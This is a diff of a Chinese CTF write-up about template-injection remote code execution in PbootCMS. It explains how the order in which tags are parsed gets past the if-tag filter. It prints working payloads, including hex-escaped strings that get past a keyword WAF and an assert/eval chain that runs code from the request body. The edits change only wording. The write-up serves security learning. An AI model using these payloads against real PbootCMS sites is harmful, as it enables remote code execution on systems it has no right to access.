@@ -104,8 +104,9 @@
           <h1 id="前言">前言</h1>
 <p>看本文之前需要了解pbootcms之前模板注入漏洞的原理</p>
 <h1 id="writeup">Writeup</h1>
-<p>开局是个pbootcms。Web🐕的老朋友了</p>
-<p>随便点几下。就会发现。只存在一个主页。其他功能点都无了。这时候。官网下个最新版审计。</p>
+<p>开局是个pbootcms。Web🐕的老朋友了。</p>
+<p>随便点几下。就会发现。只存在一个主页。其他功能点都无了。这时候。确认下版本<br>
+<code>/index.php/xxxxx</code>报错就有版本号。发现是最新版</p>
 <p>在挖掘这cms的时候。从历史漏洞入手。会发现这pboot全是模板注入的洞。根本原因就是可控输入到了解析if标签的点。刚好带入eval造成代码注入</p>
 <figure data-type="image" tabindex="1"><img src="https://c.img.dasctf.com/images/20211231/1640954097284-c20c9067-a1df-43c4-b6d0-bc5c41a38fae.png" alt="image-20211231203456773" loading="lazy"></figure>
 <p>历史版本的修复一直都是把可控点加个过滤。这整个cms。都是基于模板解析来的。也就是你所可控的都会走一遍模板解析。之后找个可控的输入点就行</p>
@@ -118,14 +119,14 @@
 <pre><code>1、可控模板内容
 2、解析各种标签
 3、替换pboot:if为pboot@if
-4、解析各种标签
+4、解析user标签把{user:password}替换为空
 5、解析if标签
 </code></pre>
 <figure data-type="image" tabindex="2"><img src="https://c.img.dasctf.com/images/20211231/1640954134732-97d968b6-845d-443c-bddc-4ef65bce19c0.png" alt="image-20211231203535370" loading="lazy"></figure>
 <p>那么问题来了。既然能通过模板解析的先后顺序来绕过pboot的if替换。是否有一个方法能把模板内的一些特殊标签解析成我们可控的输入呢。</p>
 <p>这当然有。不然哪来的题。。翻文档。</p>
 <p><code>https://www.pbootcms.com/docs/</code></p>
-<p>在公共标签中有个<code>httpurl</code>的标签</p>
+<p>在公共标签中有个<code>httpurl</code>的标签。看这名字。应该有点搞头</p>
 <figure data-type="image" tabindex="3"><img src="https://c.img.dasctf.com/images/20211231/1640955121724-cc7ac470-b7f8-4662-8add-edd7b6a6c868.png" alt="image-20211231205159865" loading="lazy"></figure>
 <p>跟进看一下</p>
 <figure data-type="image" tabindex="4"><img src="https://c.img.dasctf.com/images/20211231/1640955910776-cabea80a-54ea-46a2-9144-f6cd7fa9ebc3.png" alt="image-20211231210506622" loading="lazy"></figure>
@@ -136,7 +137,7 @@
 <figure data-type="image" tabindex="7"><img src="https://c.img.dasctf.com/images/20211231/1640956091238-9bdbaa3f-8572-4071-9f9f-c5876efaf999.png" alt="image-20211231210812097" loading="lazy"></figure>
 <figure data-type="image" tabindex="8"><img src="https://c.img.dasctf.com/images/20211231/1640956114919-faf0d373-5598-4a93-b04a-0ff22ac301be.png" alt="image-20211231210835664" loading="lazy"></figure>
 <figure data-type="image" tabindex="9"><img src="https://c.img.dasctf.com/images/20211231/1640956140521-bbf24cfb-650a-45ea-8184-a4e8fdd194f1.png" alt="image-20211231210901254" loading="lazy"></figure>
-<p>整个pboot就是先解析点基础的属性。然后再解析模板标签</p>
+<p>整个pboot就是先解析点基础的常量。然后再解析模板标签</p>
 <p>这个URL。在经过<code>self::parOutputDefine();</code>时会被解析成<code>&lt;?php echo URL;?&gt;</code></p>
 <p>这个URL。很明显是个常量。但是全局搜。没发现定义。</p>
 <p>pboot唯一一个加密文件。在<code>core/basic/Kernal.php</code>。里面是授权码鉴权啥的。懂得都懂</p>
@@ -154,12 +155,14 @@
 <p>接下来就简单了。</p>
 <pre><code>a=}{pboot{user:password}:if(([php.info][0])([1][0]));//)}xxx{/pboot:if}
 }主要是为了闭合最后的}
+
 {pboot:qrcode string{pboot:httpurl}/?a=xxx}
+
 {pboot:qrcode string{pboot:httpurl}}{pboot{user:password}:if(([php.info][0])([1][0]));//)}xxx{/pboot:if}}
 							闭合模板标签。把恶意的标签单独出去
 </code></pre>
 <p>然后就是绕waf了。害。这里加了点难度。有个长度限制。以及不能POST。</p>
-<p>饶了这么多次了。随便绕。他检测(关键字)那就引号16进制呗。直接放poc了。</p>
+<p>饶了这么多次了。随便绕。他检测关键字那就引号16进制呗。直接放poc了。</p>
 <pre><code>/?a=}{pboot{user:password}:if((&quot;prin\x74_r&quot;)(&quot;\x41&quot;));//)}xxx{/pboot{user:password}:if}
 </code></pre>
 <figure data-type="image" tabindex="13"><img src="https://c.img.dasctf.com/images/20211231/1640958067540-b128eae7-3d14-4942-abbf-d15673689c1d.png" alt="image-20211231214107859" loading="lazy"></figure>
@@ -170,8 +173,7 @@
 ini_get
 </code></pre>
 <p>接着绕下长度限制。可以试用create_function注入eval。反正关键字hex一下就行。</p>
-<p>当然还有其他方法用assert和eval的套娃了。大致<br>
-poc如下</p>
+<p>当然还有其他方法更通用的方法比如assert和eval的套娃了。大致poc如下</p>
 <pre><code>&quot;if(assert(eval('&quot;.file_get_contents(&quot;php://input&quot;).&quot;'))&quot;
 </code></pre>
 <p>由于是字符串注入到eval。所以要注意闭合。这里就看对assert和eval的认知了。</p>
